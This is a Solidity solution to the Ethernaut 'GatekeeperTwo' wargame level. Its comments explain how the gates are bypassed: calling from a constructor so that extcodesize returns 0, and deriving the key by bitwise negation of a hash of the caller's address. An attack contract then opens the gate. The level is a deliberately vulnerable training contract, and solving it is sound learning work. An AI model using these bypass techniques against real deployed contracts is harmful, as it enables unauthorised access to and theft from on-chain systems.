// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xDBC1cB2cc2399bF634f188a7009c5226333CAB5f

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

// solution

// to pass gateTwo(), extcodesize() returns 0 if it is called from the constructor of a contract
// so we call the enter() method right from the constructor of this contract

// to pass gateThree(), first, in the right side of the condition, uint64(0) - 1 will undeflow, resulting
// in the max uint64 posible, which in bits equals to all the bits in 1 (in bytes => bytes8 = 0xFFFFFFFFFFFFFFFF)
// so the left side needs to be equal to that
// we can start by calculating the left side of the XOR operator (^) using the contract address as the msg.sender
// then we need the result of the XOR to be all bits in 1, so the key should be the result of the left side, negated (~)
// because the bitwise XOR operator will return 1 when the bits are different, eg: 110101 ^ 010110 = 100010

contract HackGatekeeperTwo {
    GatekeeperTwo gatekeeper = GatekeeperTwo(0xDBC1cB2cc2399bF634f188a7009c5226333CAB5f);

    constructor() public {
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        // bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ (uint64(0) - 1); // also valid

        gatekeeper.enter(key);
    }
}